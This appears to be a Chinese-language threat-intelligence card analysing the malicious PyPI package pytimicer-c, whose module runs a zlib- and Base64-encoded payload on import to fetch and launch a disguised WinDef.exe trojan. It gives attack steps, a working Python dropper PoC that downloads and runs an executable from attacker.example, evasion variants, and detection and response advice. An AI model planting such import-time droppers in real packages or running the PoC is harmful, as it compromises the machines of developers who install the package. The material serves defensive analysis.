---
id: cloud-cicd-pypi-module-zip-base64-dropbox-exe
title: PyPI 包内嵌 ZIP+Base64 载荷：模块导入即解压执行，从 Dropbox 下载 WinDef.exe 木马运行
type: scenario
domain: cloud
path: cloud/ci-cd
technique: pypi-module-embedded-zip-base64-exe-dropper
aliases:
- pytimicer-c 投毒
- PyPI 内嵌压缩载荷
- zlib base64 模块投毒
- Dropbox 二阶段木马
- WinDef.exe 供应链投毒
tags:
- supply-chain
- pypi
- python
- dropper
- zip
- base64
- dropbox
- windows
- ci-cd
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
affected_versions: pytimicer-c 0.2、0.3、0.5、0.6、0.8、0.9、0.10、0.11、0.12、0.13（PyPI 恶意包版本）
verification:
  verified_by: verifier-V451
  verified_at: '2026-11-10T01:34:45+08:00'
  notes: 已对照原文与25/25图片核对：pytimicer-c 十个版本0.2/0.3/0.5/0.6/0.8/0.9/0.10-0.13（原文db.json）、主模块 pytimicer_c.py 内嵌 zlib+Base64 载荷顶层 exec（图14）、解出代码从 Dropbox 下载 windef.exe 至 %AppData%\TMP 并 subprocess.run（图15/16）、下载1998次、VirusTotal 25/62 均一致。dedup_review 与 evilshielded 卡区分成立（Windows EXE 投放 vs Linux 反弹Shell）。版本原文明确，保留。无 sources/source_url。未验证点：PoC 占位未执行；Dropbox 链接未复测。
---

## 一句话结论

PyPI 恶意包 `pytimicer-c` 在主模块 `pytimicer_c.py` 中嵌入经 zlib 压缩、Base64 编码的载荷，`import pytimicer_c` 时顶层 `exec(zlib.decompress(base64.b64decode(...)))` 解出执行；解出的代码用 `requests` 从 Dropbox 下载名为 `WinDef.exe` 的木马到 `%AppData%\TMP\windef.exe`，再 `subprocess.run` 启动，完成“安装包 → 云盘木马”的两级投递。

## 原理

- **主模块顶层语句即执行点**：Python 导入模块时会执行模块级代码。恶意包把整段二阶段逻辑压缩编码成一个长字符串，顶层 `exec(zlib.decompress(base64.b64decode(encoded)))` 在导入时解出并运行，不需要调用任何函数。
- **压缩 + Base64 双重编码**：zlib 压缩让载荷体积变小、字节分布失去可读性；Base64 再转成纯 ASCII 字符串，避免文件中出现大量二进制/可疑字节，也使基于明文关键字与熵值的扫描更难命中。
- **云盘托管二阶段**：真正的木马 `windef.exe` 放在 Dropbox 下载链接上。云盘域名属于常见白名单流量，攻击者可随时替换文件；`WinDef.exe` 这类型名伪装成 Windows Defender 相关程序，降低用户警觉。
- **落地与执行路径**：代码创建 `%APPDATA%\TMP` 目录（不存在则创建），把下载内容写入 `windef.exe`，随后 `subprocess.run([str(path)])` 启动。选择用户配置目录而非系统目录，普通用户权限即可写，且不易触发 UAC。
- **为什么有效**：包在 PyPI 正常可装，导入行为由业务自然触发；恶意逻辑不在 `setup.py` 而在运行期模块，安装扫描只审安装脚本时会漏掉；二阶段是独立 EXE，可在云盘侧更新为任意远控/窃密木马。
- **原文样本**：该包在 PyPI 连发 10 个版本，累计下载约 1998 次；下载的 `windef.exe` 在多引擎沙箱中被 25/62 引擎判定为恶意（家族标注含 trojan.disco/vfndp）。

## 触发条件

- 受害者安装 `pytimicer-c` 任一恶意版本（0.2–0.13 中的版本）；
- 应用或依赖导入 `pytimicer_c` 模块；
- Windows 环境（落地路径为 `%APPDATA%\TMP\windef.exe`），当前用户可写 `%APPDATA%`；
- 主机可出站访问 Dropbox 下载地址。

## 利用步骤

1. 在 PyPI 发布伪装成计时/工具库的包，主模块中放入压缩编码后的载荷字符串；
2. 模块顶层 `exec(zlib.decompress(base64.b64decode(encoded)))` 解出二阶段代码；
3. 二阶段用 `requests.get(<Dropbox 链接>, allow_redirects=True)` 下载 `windef.exe`，失败则抛错；
4. 创建 `%APPDATA%\TMP`，写入 `windef.exe`；
5. `subprocess.run([path])` 启动木马，后续由木马完成窃密/远控；
6. 攻击者通过替换云盘文件更新二阶段，无需重新发版。

## PoC

最小结构示意（不下载真实木马，用本地文件代替）：

```python
# pytimicer_c.py
import base64, zlib

encoded = base64.b64encode(zlib.compress(b'''
import os, subprocess, requests
url = "hxxp://attacker.example/payload.exe"
dest_dir = os.path.join(os.getenv("APPDATA"), "TMP")
os.makedirs(dest_dir, exist_ok=True)
dest = os.path.join(dest_dir, "windef.exe")
r = requests.get(url, allow_redirects=True)
r.raise_for_status()
open(dest, "wb").write(r.content)
subprocess.run([dest])
''')).decode()

exec(zlib.decompress(base64.b64decode(encoded)))
```

验证：在隔离环境把 URL 指向本地无害 `calc.exe` 副本或标记文件，导入模块可观察到 `%APPDATA%\TMP` 下落地文件与启动行为；不要对真实主机运行。

## 变体与关联

- 变体：编码层可换 lzma/bz2、Marshal、PyArmor 或自定义异或；托管可换 Google Drive、OneDrive、GitHub Release、对象存储。
- 变体：二阶段可改为 Python 脚本、PowerShell、DLL 侧加载或 `.pth` 持久化；执行点可放 `__init__.py`、`setup.py` 或构建后端。
- 关联：导入期 Base64 反向 Shell 见 [[cloud-cicd-pypi-import-base64-reverse-shell-remote-c2]]；`setup.py` 两阶段窃密见 [[cloud-cicd-pypi-multiplerequests-setup-py-cstealer]]；Fernet 分阶段加载见 [[cloud-cicd-pypi-fernet-encrypted-staged-loader]]。
- 边界：不导入该模块、主机无法访问云盘、或下载被 EDR 拦截时链断。

## 检测与防御

- 检测：site-packages 模块顶层出现 `zlib.decompress(base64.b64decode(...))` + `exec` 组合；长 Base64 字符串且伴随 `requests.get` 到云盘域名。
- 检测：Python 进程在 `%APPDATA%\TMP` 写入 `.exe` 后立即启动；`windef.exe` 等伪装系统组件的文件名出现在用户目录。
- 加固：只安装已审包并校验哈希；对 sdist 与模块源码做静态审计（解码内嵌字符串）；限制 Python 进程出站与子进程创建；EDR 监控从用户目录启动的未签名 EXE。
- 响应：卸载包、删除落地文件、隔离主机、封禁云盘链接、轮换主机凭据。
